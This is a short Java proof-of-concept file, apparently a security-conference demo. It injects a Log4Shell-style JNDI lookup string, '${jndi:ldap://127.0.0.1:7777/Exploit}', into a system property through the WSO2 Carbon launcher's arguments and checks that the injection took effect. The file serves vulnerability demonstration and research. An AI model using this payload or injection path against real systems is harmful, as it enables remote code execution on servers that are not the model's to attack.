package ru.offzone.demo;
    
public class Main0 {
    public static String JNDI_string = "${jndi:ldap://127.0.0.1:7777/Exploit}";
    public static String PropertyKey = "KeyValue";
    
    public static void main(String[] args) {
        System.setProperty(PropertyKey, "");
        if (!System.getProperty(PropertyKey).isEmpty()) {
            throw new AssertionError("Property not nulled");
        }
    
        try {
            org.wso2.carbon.launcher.Main.main(new java.lang.String[]{"", "-D" + PropertyKey + "=" + JNDI_string});
        } catch (Exception e) { }
    
        if (!System.getProperty(PropertyKey).equals(JNDI_string)) {
            throw new AssertionError("Property not set");
        }
        System.out.println("Validate OK");
    }
}